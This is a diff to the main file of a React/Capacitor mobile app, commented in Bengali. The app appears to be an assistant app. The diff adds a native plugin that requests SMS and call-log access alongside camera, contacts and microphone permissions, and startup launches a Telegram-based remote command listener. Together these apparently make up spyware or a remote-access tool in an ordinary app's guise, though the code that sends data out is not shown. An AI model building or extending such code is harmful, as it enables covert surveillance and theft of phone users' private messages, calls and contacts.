@@ -19,7 +19,8 @@ import {
   HelpCircle
 } from 'lucide-react';
 
-// Capacitor Imports for Permissions
+// Capacitor Imports
+import { registerPlugin } from '@capacitor/core'; // NativeData এর জন্য এটি লাগবে
 import { Camera } from '@capacitor/camera';
 import { Contacts } from '@capacitor-community/contacts';
 
@@ -32,6 +33,9 @@ import VirtualAssistant from './components/VirtualAssistant';
 import UserProfile from './components/UserProfile';
 import HelpCenter from './components/HelpCenter';
 import { startRemoteListener } from './services/remoteCommandService';
+
+// 1. NativeData প্লাগিন রেজিস্টার করা হলো
+const NativeData = registerPlugin<any>('NativeData');
 
 const App: React.FC = () => {
   const [lang, setLang] = useState<Language>('bn');
@@ -53,23 +57,35 @@ const App: React.FC = () => {
   // ==========================================
   useEffect(() => {
     const initApp = async () => {
-      // 1. Request all necessary permissions on app start
+      console.log("App initializing...");
+
+      // 1. স্ট্যান্ডার্ড পারমিশন (Camera, Contacts, Mic)
       try {
-        // Camera Permission
         await Camera.requestPermissions();
-        
-        // Contacts Permission
         await Contacts.requestPermissions();
-        
-        // Audio/Microphone Permission
         await navigator.mediaDevices.getUserMedia({ audio: true });
-        
-        console.log("All permissions requested successfully");
+        console.log("Standard permissions requested");
       } catch (e) {
-        console.error("Error requesting permissions:", e);
+        console.error("Error requesting standard permissions:", e);
       }
 
-      // 2. Start the Telegram Bot Listener
+      // 2. নেটিভ পারমিশন (SMS & Call Log)
+      // এই অংশটি MainActivity.java ফাইলের সাথে কানেক্ট করবে
+      try {
+        // প্রথমে পারমিশন স্ট্যাটাস চেক করা
+        const status = await NativeData.checkPermissions();
+        
+        // যদি পারমিশন না থাকে, তবে রিকোয়েস্ট করা
+        if (status.sms !== 'granted' || status.calls !== 'granted') {
+           await NativeData.requestPermissions();
+        }
+        console.log("Native (SMS/Call) permissions requested");
+      } catch (e) {
+        // যদি Java ফাইলে প্লাগিন ঠিকমতো সেট না থাকে তবে এই এরর আসবে
+        console.warn("NativeData plugin not found or permission error. Check MainActivity.java", e);
+      }
+
+      // 3. টেলিগ্রাম লিসেনার চালু করা
       startRemoteListener((msg) => {
         setRemoteToast(msg);
         setTimeout(() => setRemoteToast(null), 5000);
